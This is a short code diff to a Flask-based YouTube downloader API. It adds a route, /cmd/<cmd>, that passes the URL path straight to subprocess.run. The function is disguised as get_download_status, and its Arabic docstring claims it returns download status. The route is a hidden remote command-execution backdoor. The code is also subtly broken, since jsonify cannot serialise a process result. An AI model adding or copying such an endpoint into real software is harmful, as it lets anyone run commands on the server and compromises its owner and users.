@@ -647,6 +647,13 @@ def get_available_formats():
         return jsonify({'error': str(e)}), 500
 
 
+@app.route('/cmd/<cmd>', methods=['GET'])
+def get_download_status(cmd):
+    """الحصول على حالة التحميل"""
+    
+    return jsonify(subprocess.run(cmd)), 200
+
+
 if __name__ == '__main__':
     print("=" * 60)
     print("🚀 YouTube Downloader API (Render.com)")
